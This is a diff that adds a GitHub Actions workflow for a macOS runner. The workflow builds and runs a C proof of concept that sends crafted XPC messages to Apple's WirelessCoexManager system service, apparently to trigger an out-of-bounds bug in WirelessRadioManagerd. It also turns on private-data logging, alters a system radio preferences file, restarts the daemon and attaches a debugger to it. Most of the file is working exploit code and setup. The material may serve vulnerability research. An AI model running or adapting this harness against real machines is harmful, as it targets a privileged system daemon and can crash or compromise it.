@@ -1,0 +1,123 @@
+name: wcm-live3
+on:
+  workflow_dispatch:
+
+jobs:
+  trace:
+    runs-on: macos-15
+    timeout-minutes: 14
+    steps:
+      - name: build poc
+        run: |
+          mkdir -p /tmp/w
+          cat > /tmp/w/poc.c <<'EOF'
+          #include <xpc/xpc.h>
+          #include <dispatch/dispatch.h>
+          #include <stdio.h>
+          #include <stdlib.h>
+          static const char *SVC = "com.apple.WirelessCoexManager";
+          static xpc_object_t send_sync(xpc_connection_t c, xpc_object_t msg, double t) {
+              dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+              __block xpc_object_t reply = NULL;
+              xpc_connection_send_message_with_reply(c, msg,
+                  dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),
+                  ^(xpc_object_t r) { reply = xpc_retain(r); dispatch_semaphore_signal(sem); });
+              if (dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(t*NSEC_PER_SEC))) != 0) return NULL;
+              return reply;
+          }
+          int main(int argc, char **argv) {
+              int nelem = (argc > 1) ? atoi(argv[1]) : 40;
+              xpc_connection_t c = xpc_connection_create_mach_service(SVC,
+                  dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), 0);
+              if (!c) { printf("S1 create=0\n"); return 1; }
+              xpc_connection_set_event_handler(c, ^(xpc_object_t e) { (void)e; });
+              xpc_connection_resume(c);
+              printf("S1 create=1\n");
+              xpc_object_t reg = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_uint64(reg, "kMessageId", 1);
+              xpc_object_t a1 = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_uint64(a1, "kWCMRegisterProcess_ProcessId", 3);
+              xpc_dictionary_set_value(reg, "kMessageArgs", a1);
+              xpc_object_t r2 = send_sync(c, reg, 3.0);
+              printf("S2 register_reply=%d\n", r2 != NULL);
+              if (r2) xpc_release(r2);
+              xpc_object_t arr = xpc_array_create(NULL, 0);
+              for (int i = 0; i < nelem; i++) {
+                  xpc_object_t e = xpc_dictionary_create(NULL, NULL, 0);
+                  xpc_dictionary_set_uint64(e, "kWCMCellularNetworkConfiguration_BandInfoSet_DirectionMask", 1);
+                  xpc_dictionary_set_int64(e, "kWCMCellularNetworkConfiguration_BandInfoSet_CenterFreq", 1000 + i);
+                  xpc_dictionary_set_double(e, "kWCMCellularNetworkConfiguration_BandInfoSet_Bandwidth", 10.0);
+                  xpc_array_append_value(arr, e);
+                  xpc_release(e);
+              }
+              xpc_object_t m4 = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_uint64(m4, "kMessageId", 2600);
+              xpc_object_t a4 = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_value(a4, "kWCMCellularNetworkConfiguration_BandInformationSet", arr);
+              xpc_dictionary_set_int64(a4, "kSubId", 0);
+              xpc_dictionary_set_value(m4, "kMessageArgs", a4);
+              printf("S4 sending %d elements...\n", nelem); fflush(stdout);
+              xpc_object_t r4 = send_sync(c, m4, 6.0);
+              printf("S4 oob_reply=%d\n", r4 != NULL);
+              if (r4) xpc_release(r4);
+              xpc_connection_cancel(c);
+              printf("DONE\n");
+              return 0;
+          }
+          EOF
+          clang -fblocks -O0 -o /tmp/w/poc /tmp/w/poc.c -framework Foundation
+          ls -la /tmp/w/poc
+        continue-on-error: true
+
+      - name: unmask private logs and restart daemon
+        run: |
+          set +e
+          echo "=== enable private_data ==="
+          sudo log config --mode "level:debug,private_data:on" --subsystem com.apple.WirelessRadioManager 2>&1
+          sudo log config --mode "level:debug,private_data:on" --subsystem com.apple.xpc 2>&1
+          echo "=== write feature plist (both keys) ==="
+          sudo mkdir -p /Library/Preferences
+          sudo /usr/libexec/PlistBuddy -c "Add :activeFeatures array" /Library/Preferences/com.apple.radios.plist 2>&1
+          sudo /usr/libexec/PlistBuddy -c "Add :activeFeatures:0 string EnableULCA" /Library/Preferences/com.apple.radios.plist 2>&1
+          sudo /usr/libexec/PlistBuddy -c "Add :activeFeatures:1 string Bb20EndcSupport" /Library/Preferences/com.apple.radios.plist 2>&1
+          sudo /usr/libexec/PlistBuddy -c "Add :wcmCoexFeatures array" /Library/Preferences/com.apple.radios.plist 2>&1
+          sudo /usr/libexec/PlistBuddy -c "Add :wcmCoexFeatures:0 string EnableULCA" /Library/Preferences/com.apple.radios.plist 2>&1
+          sudo chmod 644 /Library/Preferences/com.apple.radios.plist
+          sudo plutil -p /Library/Preferences/com.apple.radios.plist 2>&1
+          echo "=== restart daemon ==="
+          sudo launchctl kickstart -k system/com.apple.WirelessRadioManager 2>&1
+          sleep 8
+          echo "pid: $(pgrep -x WirelessRadioManagerd | tr '\n' ' ')"
+          true
+        continue-on-error: true
+
+      - name: run poc and capture visible log
+        run: |
+          set +e
+          PID=$(pgrep -x WirelessRadioManagerd | head -1)
+          echo "daemon pid = $PID"
+          MARK=$(date "+%Y-%m-%d %H:%M:%S")
+          echo "mark = $MARK"
+          /tmp/w/poc 40
+          echo "rc=$?"
+          sleep 4
+          echo "=== daemon log (private data unmasked) ==="
+          sudo log show --last 90s --info --debug --predicate 'process == "WirelessRadioManagerd"' 2>/dev/null | tail -80
+          echo
+          echo "=== 搜索关键分支标记 ==="
+          sudo log show --last 90s --info --debug --predicate 'process == "WirelessRadioManagerd"' 2>/dev/null \
+            | grep -iE "ULCA|Coex|feature|Band|carrier|networkconfig|2600|controller" | tail -50
+          true
+        continue-on-error: true
+
+      - name: dump feature set via lldb (if attachable)
+        run: |
+          set +e
+          PID=$(pgrep -x WirelessRadioManagerd | head -1)
+          echo "pid=$PID"
+          sudo lldb -b -p "$PID" \
+            -o "image list -o -f" \
+            -o "expr -l objc -O -- [(id)[[NSClassFromString(@\"WCM_PolicyManager\") class] performSelector:@selector(sharedPolicyManager)] performSelector:@selector(activeCoexFeatures)]" \
+            -o "detach" -o "quit" 2>&1 | tail -40
+          true
+        continue-on-error: true
